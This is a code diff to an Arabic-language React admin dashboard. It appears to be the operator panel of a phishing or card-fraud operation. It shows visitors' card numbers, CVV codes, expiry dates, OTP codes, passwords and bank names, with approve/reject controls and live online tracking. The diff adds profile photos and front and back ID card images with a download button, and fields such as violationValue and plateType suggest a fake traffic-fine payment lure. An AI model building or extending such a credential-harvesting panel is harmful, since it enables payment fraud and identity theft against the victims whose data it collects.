@@ -109,43 +109,48 @@ type FlagColor = "red" | "yellow" | "green" | null;
 
 interface Notification {
   createdDate: string;
-  bank: string;
+  bank?: string;
   cardStatus?: string;
   ip?: string;
+  cvv?: string;
   id: string | "0";
-  expiryDate: string;
+  expiaryDate?: string;
   notificationCount: number;
-  otp: string;
-  otp2: string;
-  page: string;
+  otp?: string;
+  otp2?: string;
+  page?: string;
+  cardNumber?: string;
   country?: string;
-  personalInfo: {
+  personalInfo?: {
     id?: string | "0";
     name?: string;
   };
-  prefix: string;
+  prefix?: string;
   status: "pending" | "approved" | "rejected" | string;
   isOnline?: boolean;
-  lastSeen: string;
-  violationValue: number;
-  password?: string;
-  year: string;
-  month: string;
-  pagename: string;
-  plateType: string;
+  lastSeen?: string;
+  violationValue?: number;
+  pass?: string;
+  year?: string;
+  month?: string;
+  pagename?: string;
+  plateType?: string;
   allOtps?: string[] | null;
-  idNumber: string;
-  email: string;
-  mobile: string;
-  network: string;
-  phoneOtp: string;
-  cardExpiry: string;
-  name: string;
-  otpCode: string;
-  phone: string;
+  idNumber?: string;
+  email?: string;
+  mobile?: string;
+  network?: string;
+  Otp?: string;
+  cardExpiry?: string;
+  name?: string;
+  otpCode?: string;
+  userName?: string;
   flagColor?: string;
-  currentPage?: string;
-  username?: string;
+  currentPage?: number;
+  // Added fields for image preview
+  profileImage?: string;
+  idFrontImage?: string;
+  idBackImage?: string;
 }
 
 // Hook for online users count
@@ -171,11 +176,11 @@ function useOnlineUsersCount() {
 }
 
 // Hook to track online status for a specific user ID
-function useUserOnlineStatus(userId: string) {
+function useUserOnlineStatus(userName: string) {
   const [isOnline, setIsOnline] = useState(false);
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userId}`);
+    const userStatusRef = ref(database, `/status/${userName}`);
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val();
@@ -183,7 +188,7 @@ function useUserOnlineStatus(userId: string) {
     });
 
     return () => unsubscribe();
-  }, [userId]);
+  }, [userName]);
 
   return isOnline;
 }
@@ -264,13 +269,13 @@ function StatisticsCard({
 }
 
 // Enhanced User Status Component
-function UserStatus({ userId }: { userId: string }) {
+function UserStatus({ userName }: { userName: string }) {
   const [status, setStatus] = useState<"online" | "offline" | "unknown">(
     "unknown"
   );
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userId}`);
+    const userStatusRef = ref(database, `/status/${userName}`);
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val();
@@ -282,7 +287,7 @@ function UserStatus({ userId }: { userId: string }) {
     });
 
     return () => unsubscribe();
-  }, [userId]);
+  }, [userName]);
 
   return (
     <div className="flex items-center gap-2">
@@ -814,6 +819,17 @@ export default function NotificationsPage() {
   const router = useRouter();
   const onlineUsersCount = useOnlineUsersCount();
 
+  // State for image preview modal
+  const [imagePreview, setImagePreview] = useState<{
+    isOpen: boolean;
+    imageUrl: string;
+    title: string;
+  }>({
+    isOpen: false,
+    imageUrl: "",
+    title: "",
+  });
+
   // Track online status for all notifications
   const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
     {}
@@ -849,7 +865,7 @@ export default function NotificationsPage() {
 
   // Statistics calculations
   const totalVisitorsCount = notifications.length;
-  const cardSubmissionsCount = notifications.filter((n) => n.username).length;
+  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
   const approvedCount = notifications.filter(
     (n) => n.status === "approved"
   ).length;
@@ -863,7 +879,7 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.username);
+      filtered = filtered.filter((notification) => notification.cardNumber);
     } else if (filterType === "online") {
       filtered = filtered.filter(
         (notification) => onlineStatuses[notification.id]
@@ -877,8 +893,8 @@ export default function NotificationsPage() {
         (notification) =>
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
-          notification.phone?.toLowerCase().includes(term) ||
-          notification.username?.toLowerCase().includes(term) ||
+          notification.userName?.toLowerCase().includes(term) ||
+          notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term)
       );
@@ -972,8 +988,8 @@ export default function NotificationsPage() {
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.username &&
-            !notifications.some((n) => n.id === notification.id && n.username)
+            notification.cardNumber &&
+            !notifications.some((n) => n.id === notification.id && n.cardNumber)
         );
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
@@ -1017,7 +1033,7 @@ export default function NotificationsPage() {
 
     // Card submissions is the count of notifications with card info
     const cardCount = notificationsData.filter(
-      (notification) => notification.username
+      (notification) => notification.cardNumber
     ).length;
 
     setTotalVisitors(totalCount);
@@ -1035,6 +1051,14 @@ export default function NotificationsPage() {
   const closeDialog = () => {
     setSelectedInfo(null);
     setSelectedNotification(null);
+  };
+
+  const handleImagePreview = (imageUrl: string, title: string) => {
+    setImagePreview({
+      isOpen: true,
+      imageUrl,
+      title,
+    });
   };
 
   const handleFlagColorChange = async (id: string, color: string) => {
@@ -1313,7 +1337,7 @@ export default function NotificationsPage() {
                     variant="outline"
                     size="icon"
                     onClick={handleRefresh}
-                    className="relative overflow-hidden"
+                    className="relative overflow-hidden bg-transparent"
                   >
                     <RefreshCw
                       className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`}
@@ -1483,7 +1507,11 @@ export default function NotificationsPage() {
                 <div className="flex gap-2">
                   <DropdownMenu>
                     <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2">
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="gap-2 bg-transparent"
+                      >
                         <Filter className="h-4 w-4" />
                         فلترة
                       </Button>
@@ -1503,7 +1531,11 @@ export default function NotificationsPage() {
 
                   <DropdownMenu>
                     <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2">
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="gap-2 bg-transparent"
+                      >
                         <ArrowUpDown className="h-4 w-4" />
                         ترتيب
                       </Button>
@@ -1580,10 +1612,16 @@ export default function NotificationsPage() {
                 <thead>
                   <tr className="border-b bg-muted/30">
                     <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
+                      الصورة الشخصية
+                    </th>
+                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
                       الدولة
                     </th>
                     <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
                       المعلومات
+                    </th>
+                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
+                      صور الهوية
                     </th>
                     <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
                       الحالة
@@ -1606,6 +1644,29 @@ export default function NotificationsPage() {
                   {paginatedNotifications.map((notification, index) => (
                     <tr key={notification.id}>
                       <td className="px-6 py-4">
+                        <div className="flex justify-center">
+                          <Avatar
+                            className="h-12 w-12 cursor-pointer hover:ring-2 hover:ring-primary transition-all"
+                            onClick={() =>
+                              handleImagePreview(
+                                notification.profileImage || "/placeholder.svg",
+                                `صورة ${notification.userName}`
+                              )
+                            }
+                          >
+                            <AvatarImage
+                              src={
+                                notification.profileImage || "/placeholder.svg"
+                              }
+                              alt={`صورة ${notification.userName}`}
+                            />
+                            <AvatarFallback className="bg-gradient-to-br from-primary/20 to-primary/10">
+                              {notification.userName?.charAt(0) || "؟"}
+                            </AvatarFallback>
+                          </Avatar>
+                        </div>
+                      </td>
+                      <td className="px-6 py-4">
                         <div className="flex items-center gap-3">
                           <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                             <MapPin className="h-4 w-4 text-primary" />
@@ -1619,10 +1680,10 @@ export default function NotificationsPage() {
                         <div className="flex flex-wrap gap-2">
                           <Badge
                             variant={
-                              notification.phone ? "default" : "secondary"
+                              notification.userName ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.phone
+                              notification.userName
                                 ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                 : ""
                             }`}
@@ -1631,16 +1692,16 @@ export default function NotificationsPage() {
                             }
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.phone
+                            {notification.userName
                               ? "معلومات شخصية"
                               : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
                             variant={
-                              notification.username ? "default" : "secondary"
+                              notification.cardNumber ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.username
+                              notification.cardNumber
                                 ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                 : ""
                             }`}
@@ -1649,12 +1710,84 @@ export default function NotificationsPage() {
                             }
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.username
+                            {notification.cardNumber
                               ? "معلومات البطاقة"
                               : "لا يوجد بطاقة"}
                           </Badge>
                         </div>
                       </td>
+                      <td className="px-6 py-4">
+                        <div className="flex justify-center gap-2">
+                          <TooltipProvider>
+                            <Tooltip>
+                              <TooltipTrigger asChild>
+                                <div
+                                  className="relative w-16 h-10 bg-gradient-to-br from-blue-50 to-blue-100 rounded-lg border-2 border-blue-200 cursor-pointer hover:border-blue-400 transition-all overflow-hidden"
+                                  onClick={() =>
+                                    handleImagePreview(
+                                      notification.idFrontImage ||
+                                        "/placeholder.svg",
+                                      `الهوية الأمامية - ${notification.userName}`
+                                    )
+                                  }
+                                >
+                                  <img
+                                    src={
+                                      notification.idFrontImage ||
+                                      "/placeholder.svg"
+                                    }
+                                    alt="الهوية الأمامية"
+                                    className="w-full h-full object-cover"
+                                  />
+                                  <div className="absolute inset-0 bg-black/20 flex items-center justify-center">
+                                    <span className="text-white text-xs font-bold">
+                                      أمامي
+                                    </span>
+                                  </div>
+                                </div>
+                              </TooltipTrigger>
+                              <TooltipContent>
+                                <p>عرض الهوية الأمامية</p>
+                              </TooltipContent>
+                            </Tooltip>
+                          </TooltipProvider>
+
+                          <TooltipProvider>
+                            <Tooltip>
+                              <TooltipTrigger asChild>
+                                <div
+                                  className="relative w-16 h-10 bg-gradient-to-br from-green-50 to-green-100 rounded-lg border-2 border-green-200 cursor-pointer hover:border-green-400 transition-all overflow-hidden"
+                                  onClick={() =>
+                                    handleImagePreview(
+                                      notification.idBackImage ||
+                                        "/placeholder.svg",
+                                      `الهوية الخلفية - ${notification.userName}`
+                                    )
+                                  }
+                                >
+                                  <img
+                                    src={
+                                      notification.idBackImage ||
+                                      "/placeholder.svg"
+                                    }
+                                    alt="الهوية الخلفية"
+                                    className="w-full h-full object-cover"
+                                  />
+                                  <div className="absolute inset-0 bg-black/20 flex items-center justify-center">
+                                    <span className="text-white text-xs font-bold">
+                                      خلفي
+                                    </span>
+                                  </div>
+                                </div>
+                              </TooltipTrigger>
+                              <TooltipContent>
+                                <p>عرض الهوية الخلفية</p>
+                              </TooltipContent>
+                            </Tooltip>
+                          </TooltipProvider>
+                        </div>
+                      </td>
+
                       <td className="px-6 py-4">
                         {notification.status === "approved" ? (
                           <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
@@ -1687,7 +1820,7 @@ export default function NotificationsPage() {
                         </div>
                       </td>
                       <td className="px-6 py-4 text-center">
-                        <UserStatus userId={notification.id} />
+                        <UserStatus userName={notification.id} />
                       </td>
                       <td className="px-6 py-4 text-center">
                         {notification.otp && (
@@ -1795,7 +1928,7 @@ export default function NotificationsPage() {
                           </p>
                         </div>
                       </div>
-                      <UserStatus userId={notification.id} />
+                      <UserStatus userName={notification.id} />
                     </div>
                   </CardHeader>
 
@@ -1803,9 +1936,11 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.phone ? "default" : "secondary"}
+                          variant={
+                            notification.userName ? "default" : "secondary"
+                          }
                           className={`cursor-pointer ${
-                            notification.phone
+                            notification.userName
                               ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                               : ""
                           }`}
@@ -1814,23 +1949,23 @@ export default function NotificationsPage() {
                           }
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.phone
+                          {notification.userName
                             ? "معلومات شخصية"
                             : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={
-                            notification.username ? "default" : "secondary"
+                            notification.cardNumber ? "default" : "secondary"
                           }
                           className={`cursor-pointer ${
-                            notification.username
+                            notification.cardNumber
                               ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                               : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.username
+                          {notification.cardNumber
                             ? "معلومات البطاقة"
                             : "لا يوجد بطاقة"}
                         </Badge>
@@ -1844,7 +1979,7 @@ export default function NotificationsPage() {
                           {notification.status === "approved" ? (
                             <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                               <CheckCircle className="h-3 w-3 mr-1" />
-                              {notification?.otp}
+                              موافق عليه
                             </Badge>
                           ) : notification.status === "rejected" ? (
                             <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
@@ -1971,7 +2106,7 @@ export default function NotificationsPage() {
                     value: selectedNotification.email,
                   },
                   { label: "رقم الجوال", value: selectedNotification.mobile },
-                  { label: "رقم الهوية", value: selectedNotification.phone },
+                  { label: "الهاتف", value: selectedNotification.userName },
                 ].map(
                   ({ label, value }) =>
                     value && (
@@ -1997,21 +2132,18 @@ export default function NotificationsPage() {
                   { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.username,
+                    value: selectedNotification?.cardNumber,
                   },
                   {
                     label: "تاريخ الانتهاء",
                     value:
                       selectedNotification.year && selectedNotification.month
                         ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiryDate,
+                        : selectedNotification.expiaryDate,
                   },
-                  { label: "رمز الأمان", value: selectedNotification.password },
+                  { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
-                  {
-                    label: "كلمة المرور",
-                    value: selectedNotification.password,
-                  },
+                  { label: "كلمة المرور", value: selectedNotification.pass },
                 ].map(
                   ({ label, value }) =>
                     value && (
@@ -2022,7 +2154,9 @@ export default function NotificationsPage() {
                         <span className="font-medium text-muted-foreground">
                           {label}:
                         </span>
-                        <span className="font-semibold">{value}</span>
+                        <span className="font-semibold" dir="ltr">
+                          {value}
+                        </span>
                       </div>
                     )
                 )}
@@ -2049,6 +2183,50 @@ export default function NotificationsPage() {
               </div>
             </div>
           )}
+        </DialogContent>
+      </Dialog>
+
+      {/* Image Previewn Modal */}
+      <Dialog
+        open={imagePreview.isOpen}
+        onOpenChange={(open) =>
+          setImagePreview((prev) => ({ ...prev, isOpen: open }))
+        }
+      >
+        <DialogContent className="max-w-4xl max-h-[90vh] overflow-hidden">
+          <DialogHeader>
+            <DialogTitle className="text-right">
+              {imagePreview.title}
+            </DialogTitle>
+          </DialogHeader>
+          <div className="flex justify-center items-center p-4">
+            <img
+              src={imagePreview.imageUrl || "/placeholder.svg"}
+              alt={imagePreview.title}
+              className="max-w-full max-h-[70vh] object-contain rounded-lg shadow-lg"
+            />
+          </div>
+          <div className="flex justify-center gap-2 mt-4">
+            <Button
+              variant="outline"
+              onClick={() =>
+                setImagePreview((prev) => ({ ...prev, isOpen: false }))
+              }
+            >
+              إغلاق
+            </Button>
+            <Button
+              onClick={() => {
+                const link = document.createElement("a");
+                link.href = imagePreview.imageUrl;
+                link.download = `${imagePreview.title}.jpg`;
+                link.click();
+              }}
+              className="bg-gradient-to-r from-blue-500 to-blue-600 text-white"
+            >
+              تحميل الصورة
+            </Button>
+          </div>
         </DialogContent>
       </Dialog>
     </div>
